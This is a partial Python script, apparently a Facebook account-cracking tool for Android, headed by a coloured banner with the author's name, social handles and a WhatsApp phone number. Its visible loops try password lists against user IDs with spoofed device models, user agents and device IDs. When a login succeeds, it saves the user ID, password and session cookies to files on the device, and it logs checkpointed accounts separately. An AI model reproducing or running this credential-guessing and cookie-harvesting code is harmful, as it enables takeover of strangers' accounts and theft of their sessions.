...
==============================================
\033[1;31m===============================================
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mAUTHER     \033[1;31m┇\033[31;47m{𝐀𝐋𝐇𝐀𝐌𝐎𝐃𝐄𝐄𝐍 𝐀𝐓𝐀𝐋}\33[0;m      
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mFACEBOOK   \033[1;31m┇\033[37;41m{𝙰𝙻𝙷𝙰𝙼𝙾𝙳𝙴𝙴𝙽𝙰𝚃𝙰𝙻}\33[0;m
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mGITHUB    \033[1;31m ┇\033[1;37m{𝐀𝐋𝐇𝐀𝐌𝐎𝐃𝐄𝐄𝐍 𝐀𝐓𝐀𝐋.guthub.com
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mYOUTUBE   \033[1;31m ┇\033[1;37m{𝙰𝙻𝙷𝙰𝙼𝙾𝙳𝙴𝙴𝙽 𝙰𝚃𝙰𝙻}\33[0;m      
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mWHATSAPP \33[1;31m  ┇\033[31;47m{ +93789937452  }\33[0;m
...
\033[1;31m===============================================
\33[37;41m\t WELLCOME TO 🔑𝙰𝙻𝙷𝙰𝙼𝙾𝙳𝙴𝙴𝙽 𝙰𝚃𝙰𝙻🔑 TOOLS\33[0;m
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [𝐀𝐓𝐀𝐋💘-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/𝙰𝚃𝙰𝙻💘-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/𝐀𝐓𝐀𝐋💘--OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                    ...
                                    #    print('\r\r\x1b[1;31m [𝐀𝐓𝐀𝐋🤧-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/𝙰𝚃𝙰𝙻🤧-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [ALHAM-Rndt] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  = 'Dalvik/2.0.0 (Linux; U; Android 11; Google Pixel 6 Build/SD1A.210329.012) [FBAN/FB4A;FBAV/;{application_version};FBBV/{application_version};FBDM/{density=3.0,width=1080,height=2340};FBLC/en_US;FBRV/'+str(random.randint(10000000, 99999999))+';FBCR/Google;FBMF/Google;FBBD/Pixel 6;FBPN/com.facebook.katana;FBDV/Pixel 6;FBSV/11;FBOP/9;FBCA/arm-v7a;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[31;47m [𝙰𝚃𝙰𝙻💘==>OK]\33[0;m\033[1;33m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print('\r\r\033[31;47m'"Cookie:\33[0;m\033[1;32m "+coki)
                                        open('/sdcard/𝙰𝚃𝙰𝙻 BOODQR.txt','a').write(coki+'\n')
                                        open('/sdcard/𝐀𝐋𝐇𝐀𝐌𝐎𝐃𝐄𝐄𝐍 𝐀𝐓𝐀𝐋 R.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        open('/sdcard/𝙰𝚃𝙰𝙻 R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
